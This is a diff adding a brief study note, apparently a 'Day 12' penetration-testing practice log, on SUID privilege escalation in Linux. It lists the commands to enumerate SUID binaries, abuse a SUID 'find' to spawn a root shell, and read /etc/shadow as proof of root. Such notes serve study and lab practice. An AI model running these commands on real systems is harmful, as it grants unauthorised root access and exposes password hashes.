@@ -1,0 +1,19 @@
+Day 12 - SUID Privilege Escalation
+
+# Check current user
+whoami
+id
+
+# Enumerate SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Exploit SUID find binary
+/usr/bin/find . -exec /bin/sh \; -quit
+
+# Verify root access
+whoami
+id
+
+# Proof of root privileges
+cat /etc/shadow | head
+hostname
